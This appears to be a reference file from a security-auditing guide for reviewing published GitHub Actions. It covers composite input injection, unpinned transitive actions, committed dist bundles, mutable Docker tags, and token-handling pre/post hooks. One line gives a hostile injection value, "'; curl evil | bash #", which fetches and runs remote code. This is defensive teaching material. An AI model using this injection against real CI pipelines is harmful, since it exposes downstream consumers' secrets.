# Auditing repo-root `action.yml` / `action.yaml`

If the repo *publishes* an action — i.e. it has an `action.yml` (or `action.yaml`) at the root or under a path consumers reference via `uses: owner/repo/path@sha` — its blast radius is every downstream consumer. The action itself becomes a supply-chain link. Audit with extra paranoia.

## Action types

Read `runs.using:` to determine the audit shape.

| `runs.using` | Audit as |
|---|---|
| `composite` | Each `runs.steps[*]` follows the same rules as a workflow step — see [workflows.md](workflows.md). |
| `node20`, `node24` | Audit `runs.pre:`, `runs.main:`, `runs.post:` paths for pin/legitimacy. Stop at the JS source (treat as external binary). |
| `docker` | Audit `runs.image:` reference (Docker tag pinning, registry trust). Stop at the container source. |

## Patterns specific to action publishers

### 1. Action inputs interpolated into composite `run:` (CRITICAL)

```yaml
inputs:
  user-supplied:
    description: Anything the consumer passes
runs:
  using: composite
  steps:
    - run: echo "Hello ${{ inputs.user-supplied }}"
      shell: bash
```

The consumer's caller controls `inputs.user-supplied`. If they pass `'; curl evil | bash #` and the input lands in a `run:` block, that is shell injection in the *consumer's* runner — exfiltrating *their* secrets. Same fix as workflows: pass via `env:`, then quote the variable.

This is harder to spot than workflow injection because the action author tested with their own benign input. Every input is untrusted from the action's perspective.

### 2. Composite steps with hard-coded third-party action pins (CRITICAL)

Composite actions can call other actions. The same pinning rules apply — every `uses: foo/bar@<ref>` inside `runs.steps:` must be a 40-char SHA, with legitimacy verified.

The blast radius multiplies: an unpinned transitive action in a composite that thousands of repos depend on is a single point of compromise for the entire downstream tree. tj-actions/changed-files had this shape — its transitive `reviewdog/action-setup@v1` was unpinned, that got force-moved, the entire `tj-actions` ecosystem fell.

### 3. JavaScript actions distributing built `dist/` (HIGH)

Node actions distribute committed `dist/index.js` (the bundled action entrypoint). The action consumer runs this code with their secrets in the environment. Reviewers cannot meaningfully diff a minified `dist/index.js`.

Flag if:
- `dist/` is committed but no CI step verifies it was built from the committed source (no `npm run build && git diff --exit-code dist/` gate).
- The action does not publish to the marketplace with signed releases / provenance.

This is a soft signal — not directly an exploitable bug, but it removes the consumer's ability to audit. Mention it once, not as a per-step finding.

### 4. Docker actions pulling from mutable tags (HIGH)

`runs.image: docker://registry/foo:latest` or `:v1` — tag mutability hits container registries too. Pin to `@sha256:<digest>`. Avoid Docker Hub for production actions (rate limits, registry availability).

### 5. `pre:` / `post:` hooks accessing tokens (HIGH)

`runs.pre:` and `runs.post:` execute before/after the main step, with access to the same environment. A malicious action can stash a token in `pre:`, do legitimate work in `main:`, exfiltrate in `post:`. From an audit perspective, treat `pre:` and `post:` as equally sensitive surfaces.

## Multiple actions in one repo

Some repos publish several actions (`actions/foo/action.yml`, `actions/bar/action.yml`). Audit each independently. Each can be pinned separately by consumers (`uses: owner/repo/actions/foo@sha`).

## After the walk

Hand control back to SKILL.md step 5.
